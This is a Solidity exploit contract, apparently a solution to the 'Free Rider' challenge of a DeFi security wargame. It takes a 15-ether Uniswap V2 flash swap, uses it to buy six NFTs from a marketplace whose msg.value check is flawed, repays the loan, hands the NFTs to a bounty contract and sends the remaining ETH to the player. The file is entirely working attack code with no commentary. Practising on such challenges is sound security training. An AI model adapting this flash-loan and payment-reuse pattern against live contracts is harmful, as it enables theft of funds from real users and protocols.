// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "hardhat/console.sol";

interface ISwap {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH {
    function approve(address guy, uint256 wad) external returns (bool);

    function transferFrom(
        address src,
        address dst,
        uint256 wad
    ) external returns (bool);

    function withdraw(uint256 wad) external;

    function balanceOf(address) external view returns (uint256);

    function transfer(address dst, uint256 wad) external returns (bool);

    function deposit() external payable;

    function allowance(address, address) external view returns (uint256);
}

contract testFlashloanFreeRider {
    address player;
    address flashLoan;
    address governance;
    address token;
    address pair;
    address FreeRiderNFTMarketplace;
    address weth;
    address devContract;
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];
    address nft;

    constructor(
        address _weth,
        address _token,
        address _player,
        address _pair,
        address _FreeRiderNFTMarketplace,
        address _devContract,
        address _nft
    ) {
        weth = _weth;
        token = _token;
        player = _player;
        pair = _pair;
        FreeRiderNFTMarketplace = _FreeRiderNFTMarketplace;
        devContract = _devContract;
        nft = _nft;
    }

    function start() external {
        (uint amount0Out, uint amount1Out) = token < weth
            ? (uint(0), uint(15 ether))
            : (uint(15 ether), uint(0));
        ISwap(pair).swap(amount0Out, amount1Out, address(this), "1");
    }

    function end() external {
        //     function safeTransferFrom(
        //     address from,
        //     address to,
        //     uint256 tokenId,
        //     bytes memory data
        // ) public
        for (uint i; i < 6; i++) {
            IERC721(nft).safeTransferFrom(
                address(this),
                devContract,
                tokenIds[i],
                abi.encode(player)
            );
        }
        console.log("balance", address(this).balance);
        player.call{value: address(this).balance}("");
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        printTokenBalance(weth, address(this), "flashloan weth balance");
        IWETH(weth).withdraw(15 ether);

        IFreeRiderNFTMarketplace(FreeRiderNFTMarketplace).buyMany{
            value: 15 ether
        }(tokenIds);

        uint256 needReturn = (15 ether * 1000) / uint256(997) + 1;
        IWETH(weth).deposit{value: needReturn}();
        IWETH(weth).transfer(pair, needReturn);
    }

    function printTokenBalance(
        address _token,
        address addr,
        string memory msg
    ) public returns (uint256) {
        (bool suc, bytes memory bal) = _token.call(
            abi.encodeWithSignature("balanceOf(address)", addr)
        );
        require(suc, msg);
        uint256 balance = abi.decode(bal, (uint256));

        console.log(msg, balance);
        return balance;
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory _data
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
